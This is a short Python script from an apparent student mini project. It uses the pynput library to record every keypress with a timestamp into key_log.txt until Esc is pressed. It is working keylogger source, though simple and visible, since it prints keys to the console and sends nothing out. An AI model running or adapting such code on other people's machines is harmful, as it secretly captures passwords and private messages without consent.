# PPLP Mini Project - KEYLOGGER
# Created on 16/10/2021


import datetime                                             # For using datetime.now()

from pynput.keyboard import Listener, Key                   # For monitoring the keyboard

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        write_key(keys)
        count = 0
        keys = []


def write_key(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            cdt = datetime.datetime.now()                   # For getting present date and time
            ctd_s = str(cdt)                                # Converting it into a string for appending in the text file
            f.write(ctd_s)
            f.write(' : ')
            f.write(str(key))
            f.write(' Pressed\n')


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
